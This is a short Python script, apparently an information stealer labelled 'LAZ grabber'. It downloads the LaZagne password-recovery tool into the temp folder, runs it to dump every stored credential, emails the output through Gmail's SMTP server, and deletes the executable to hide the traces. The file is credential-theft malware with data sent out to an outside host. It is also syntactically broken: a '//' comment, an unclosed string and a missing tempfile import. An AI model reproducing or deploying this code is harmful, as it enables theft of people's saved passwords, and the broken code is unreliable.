import requests
import subprocess
import re
import smtplib
import os

def download(url):
    get_response = requests.get(url)
    file = url.split("/")[-1]
    with open(file,"wb") as output:
        output.write(get_response.content)

def send_email(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()
//LAZ grabber OLD METHOD

tempf = tempfile.gettempdir()
os.chdir(tempf)
download("apache2LaZagneURL")
execute = subprocess.check_output("laZagne.exe all", shell=True)
send_email("example@example.com", "passEXAMPLE", execute)
os.remove("laZagne.exe) #laZagne tool for recovering data
